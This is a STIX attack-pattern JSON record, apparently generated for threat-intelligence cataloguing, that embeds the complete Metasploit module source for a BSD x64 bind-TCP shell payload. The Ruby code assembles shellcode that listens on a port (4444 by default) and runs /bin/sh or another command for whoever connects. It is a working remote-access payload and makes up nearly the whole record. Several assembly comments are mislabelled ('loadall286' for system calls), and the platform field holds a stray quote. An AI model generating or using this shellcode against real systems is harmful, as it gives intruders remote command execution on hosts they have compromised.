{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd6f142c-51aa-45c5-85a1-36d0eb898017",
    "created": "2024-08-14T16:33:19.413736Z",
    "modified": "2024-08-14T16:33:19.41374Z",
    "name": "BSD x64 Shell Bind TCP",
    "description": "Bind an arbitrary command to an arbitrary port",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x64/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 136\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD x64 Shell Bind TCP',\n      'Description'   => 'Bind an arbitrary command to an arbitrary port',\n      'Author'        => [\n        'nemo <nemo[at]felinemenace.org>',\n        'joev'\n      ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix\n    ))\n\n    # exec payload options\n    register_options(\n      [\n        OptString.new('CMD',  [ true,  \"The command string to execute\", \"/bin/sh\" ]),\n        Opt::LPORT(4444)\n    ])\n  end\n\n  # build the shellcode payload dynamically based on the user-provided CMD\n  def generate(_opts = {})\n    cmd  = (datastore['CMD'] || '') + \"\\x00\"\n    port = [datastore['LPORT'].to_i].pack('n')\n    call = \"\\xe8\" + [cmd.length].pack('V')\n    payload =\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x61\" +             # add eax,0x61\n      \"\\x6A\\x02\" +                 # push byte 0x1\n      \"\\x5f\" +                     # pop rdi\n      \"\\x6A\\x01\" +                 # push byte 0x1\n      \"\\x5e\" +                     # pop rsi\n      \"\\x48\\x31\\xD2\" +             # xor rdx,rdx\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x48\\x89\\xC7\" +             # mov rdi,rax\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x68\" +             # add eax,0x68\n      \"\\x48\\x31\\xF6\" +             # xor rsi,rsi\n      \"\\x56\" +                     # push rsi\n      \"\\xBE\\x00\\x02\" + port +      # mov esi,0xb3150200\n      \"\\x56\" +                     # push rsi\n      \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n      \"\\x6A\\x10\" +                 # push 0x10\n      \"\\x5A\" +                     # pop rdx\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x6A\" +             # add eax,0x6a\n      \"\\x48\\x31\\xF6\" +             # xor rsi,rsi\n      \"\\x48\\xFF\\xC6\" +             # inc rsi\n      \"\\x49\\x89\\xFC\" +             # mov r12,rdi\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x1E\" +             # add eax,0x1e\n      \"\\x4C\\x89\\xE7\" +             # mov rdi,r12\n      \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n      \"\\x48\\x89\\xE2\" +             # mov rdx,rsp\n      \"\\x48\\x83\\xEA\\x04\" +         # sub rdx,byte +0x4\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x48\\x89\\xC7\" +             # mov rdi,rax\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x5A\" +             # add eax,0x5a\n      \"\\x48\\x31\\xF6\" +             # xor rsi,rsi\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x5A\" +             # add eax,0x5a\n      \"\\x48\\xFF\\xC6\" +             # inc rsi\n      \"\\x0F\\x05\" +                 # loadall286\n      \"\\x48\\x31\\xC0\" +             # xor rax,rax\n      \"\\x31\\xc0\" +                 # xor eax,eax\n      \"\\x83\\xc0\\x3b\" +             # add eax,0x3b\n      call +                       # call CMD.len\n      cmd +                        # CMD\n      \"\\x48\\x8b\\x3c\\x24\" +         # mov rdi, [rsp]\n      \"\\x48\\x31\\xD2\" +             # xor rdx,rdx\n      \"\\x52\" +                     # push rdx\n      \"\\x57\" +                     # push rdi\n      \"\\x48\\x89\\xE6\" +             # mov rsi,rsp\n      \"\\x0F\\x05\"                   # loadall286\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}